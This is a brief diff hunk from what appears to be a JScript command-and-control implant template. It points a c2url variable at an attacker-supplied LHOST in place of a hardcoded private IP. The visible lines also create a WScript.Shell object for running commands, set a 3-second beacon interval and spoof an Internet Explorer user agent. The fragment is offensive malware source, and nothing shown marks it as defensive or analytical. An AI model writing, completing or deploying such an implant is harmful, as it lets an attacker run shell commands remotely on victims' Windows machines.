@@ -3,7 +3,7 @@
 //#######################
 var curcmd = "";
 var serverMsg = "";
-var c2url = "http://192.168.86.249";
+var c2url = "http://" + LHOST;
 var objShell = new ActiveXObject("WScript.Shell");
 var beaconTime = 3000;
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
